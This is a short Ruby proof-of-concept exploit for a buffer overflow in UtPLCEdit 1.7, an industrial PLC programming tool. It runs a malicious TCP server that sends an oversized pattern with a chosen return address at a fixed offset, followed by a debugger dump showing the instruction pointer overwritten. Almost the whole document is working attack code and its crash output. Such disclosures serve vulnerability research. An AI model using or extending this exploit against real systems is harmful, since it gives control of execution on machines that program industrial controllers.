#!/usr/bin/env ruby
# UtPLCEdit 1.7 Buffer Overflow
# Ethernet / Under 'PLC' select 'Program Flash Modules' to trigger the bug

require 'socket'
require 'rex'

buff = Rex::Text.pattern_create(1024)
buff[1008, 4] = [0xfeedface].pack('V')

server = TCPServer.new 49999

loop do
  client =  server.accept
  select(nil,nil,nil,0)
  client.write(buff + "\n")
end
__END__
(5d4.38c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=feedface edx=777071cd esi=00000000 edi=00000000
eip=feedface esp=0012d614 ebp=0012d634 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
feedface ??              ???

